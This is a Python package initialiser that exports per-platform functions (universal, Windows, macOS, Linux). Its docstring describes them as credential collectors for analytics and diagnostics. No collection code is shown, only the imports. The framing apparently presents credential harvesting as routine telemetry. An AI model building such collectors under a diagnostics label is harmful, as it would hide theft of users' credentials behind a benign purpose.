"""
Credential collectors for analytics and diagnostics.
"""
from .universal import collect_universal_data
from .windows import collect_windows_data
from .macos import collect_macos_data
from .linux import collect_linux_data

__all__ = [
    'collect_universal_data',
    'collect_windows_data',
    'collect_macos_data',
    'collect_linux_data'
]
